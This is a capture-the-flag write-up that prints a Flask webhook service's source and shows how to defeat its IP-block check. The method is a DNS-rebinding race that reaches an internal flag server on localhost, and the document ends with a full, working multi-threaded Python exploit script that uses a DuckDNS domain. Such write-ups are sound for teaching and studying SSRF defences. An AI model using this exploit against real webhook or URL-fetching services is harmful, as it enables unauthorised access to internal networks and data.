# CTF Competition: Sunshine CTF

### CTF Name: Intergalactic Webhook Service
**CTF Weight:** 417 points


Let's look at the source code for this fun little webhook service:

```commandline
FLAG = load_flag()

class FlagHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        if self.path == '/flag':
            self.send_response(200)
            self.send_header('Content-Type', 'text/plain')
            self.end_headers()
            self.wfile.write(FLAG.encode())
        else:
            self.send_response(404)
            self.end_headers()

threading.Thread(target=lambda: HTTPServer(('127.0.0.1', 5001), FlagHandler).serve_forever(), daemon=True).start()

app = Flask(__name__)

registered_webhooks = {}

def create_app():
    return app

@app.route('/')
def index():
    return render_template('index.html')

def is_ip_allowed(url):
    parsed = urlparse(url)
    host = parsed.hostname or ''
    try:
        ip = socket.gethostbyname(host)
    except Exception:
        return False, f'Could not resolve host'
    ip_obj = ipaddress.ip_address(ip)
    if ip_obj.is_private or ip_obj.is_loopback or ip_obj.is_link_local or ip_obj.is_reserved:
        return False, f'IP "{ip}" not allowed'
    return True, None

@app.route('/register', methods=['POST'])
def register_webhook():
    url = request.form.get('url')
    if not url:
        abort(400, 'Missing url parameter')
    allowed, reason = is_ip_allowed(url)
    if not allowed:
        return reason, 400
    webhook_id = str(uuid.uuid4())
    registered_webhooks[webhook_id] = url
    return jsonify({'status': 'registered', 'url': url, 'id': webhook_id}), 200

@app.route('/trigger', methods=['POST'])
def trigger_webhook():
    webhook_id = request.form.get('id')
    if not webhook_id:
        abort(400, 'Missing webhook id')
    url = registered_webhooks.get(webhook_id)
    if not url:
        return jsonify({'error': 'Webhook not found'}), 404
    allowed, reason = is_ip_allowed(url)
    if not allowed:
        return jsonify({'error': reason}), 400
    try:
        resp = requests.post(url, timeout=5, allow_redirects=False)
        return jsonify({'url': url, 'status': resp.status_code, 'response': resp.text}), resp.status_code
    except Exception:
        return jsonify({'url': url, 'error': 'something went wrong'}), 500

```

So the `/Register` endpoint will take a given URL and run it through `is_ip_allowed(url)`. If the IP is good then we get a json token which we feed into the 
`/trigger` endpoint. 

There is another server on port 5001 which contains the flag.
`threading.Thread(target=lambda: HTTPServer(('127.0.0.1', 5001), FlagHandler).serve_forever(), daemon=True).start()` 

It is important to not that you cannot directly access this server as it was created in the docker. So even when testing on local,
you will not be able to directly go to  `127.0.0.1:5001`. Only the service/container itself will be able to access it. 

It is important to note that the `is_ip_allowed(url)` is a preventative measure that is restricting certain ip addresses:

```
ip_obj = ipaddress.ip_address(ip)
    if ip_obj.is_private or ip_obj.is_loopback or ip_obj.is_link_local or ip_obj.is_reserved:
        return False, f'IP "{ip}" not allowed'
```

This is a big issue because the flag is at 127.0.0.1 which is being blocked by this function.

Hmmm... lets think

During registration, it is preventing us from submitting a url that resolves to a private or local address.. so what if 
we first submitted an url that resolves to a  public address, then once it passes registration change it back to `127.0.0.1`

I used Duck DNS to carry out the DNS rebinding attack.

So the attack flow is as follows:

```
1) set controlled domain to resolve to valid public url

2) register this domain with the webhook service and retrieve the token

4) change the domain to resolve to 127.0.0.1

3) submit the token to /trigger
```

Now there is another `is_ip_allowed(url)` check in the trigger function which is very annoying and once again prevents us 
from going to the flag endpoint.

However, I can send ALOT of requests to the `/trigger` endpoint and during that call, then change the domain to resolve to `127.0.0.1`
This way, the domain rebinding will happen inside the `/trigger` function and we can potentially do a TOCTOU attack inside the function.

So the new attack flow is:

```
1) set controlled domain to resolve to valid public url

2) register this domain with the webhook service and retrieve the token

3) submit Thousands of requests to /trigger endpoint

    3a) change the domain to resolve to 127.0.0.1

```

Final script:
```commandline
#!/usr/bin/env python3
import requests
import threading
import time

DUCK_TOKEN = "<hehe no leaks >"
DOMAIN = "characterwhitectf.duckdns.org"

def update_dns(ip):
    requests.get(f"https://www.duckdns.org/update?domains={DOMAIN}&token={DUCK_TOKEN}&ip={ip}")

def attack():
    update_dns("208.67.222.222")
    time.sleep(0.3)
    
    r = requests.post("https://supernova.sunshinectf.games/register", 
                     data={"url": f"http://{DOMAIN}:5001/flag"})
    wid = r.json().get("id")
    
    for _ in range(20):
        update_dns("127.0.0.1")
        time.sleep(0.02)
        
        results = []
        def worker():
            try:
                r = requests.post("https://supernova.sunshinectf.games/trigger", 
                                 data={"id": wid}, timeout=6)
                if "sun{" in r.text:
                    results.append(r.text)
            except: pass
        
        threads = [threading.Thread(target=worker) for _ in range(120)]
        for t in threads: t.start()
        for t in threads: t.join()
        
        for flag in results:
            print(flag)
            return
        

attack()
```
